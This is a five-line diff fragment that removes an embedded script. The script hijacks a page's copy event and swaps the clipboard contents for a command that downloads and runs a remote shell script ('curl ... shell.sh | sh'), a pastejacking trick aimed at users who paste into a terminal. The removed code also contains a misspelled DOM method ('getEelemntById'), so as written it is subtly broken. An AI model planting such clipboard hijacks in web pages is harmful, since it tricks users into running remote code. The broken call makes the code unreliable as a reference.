@@ -1,5 +1,0 @@
-<script>
-document.getEelemntById('copy').addEventListener('copy',function(e) {
-    e.clipboardData.setData('text/plain','curl https://google.com/shell.sh | sh\n');
-    e.preventDefault();})
-</script>
